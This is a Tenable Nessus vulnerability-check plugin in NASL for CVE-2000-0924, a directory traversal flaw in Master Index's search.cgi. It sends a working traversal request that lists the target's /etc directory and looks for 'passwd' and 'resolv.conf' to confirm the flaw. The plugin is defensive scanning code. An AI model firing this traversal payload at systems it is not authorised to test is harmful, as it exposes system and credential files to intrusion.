#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10562);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2000-0924");
 script_bugtraq_id(1772);
 script_xref(name:"OSVDB", value:"461");

 script_name(english:"Master Index search.cgi Traversal Arbitrary File/Directory Access");
 script_summary(english:"Attempts a directory traversal attack");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application on the remote host has a directory traversal\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The version of Master Index running on the remote web server has a\n",
     "directory traversal vulnerability.  Input to the 'catigory'\n",
     "parameter of search.cgi is not properly sanitized.  A remote attacker\n",
     "could exploit this to read arbitrary files from the system."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-10/0141.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 url = string(dir, "/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc");
 r = http_send_recv3(method:"GET", item:url, port:port);
 if("passwd" >< r[2] && "resolv.conf" >< r[2] ){
 	security_warning(port);
	exit(0);
	}
}
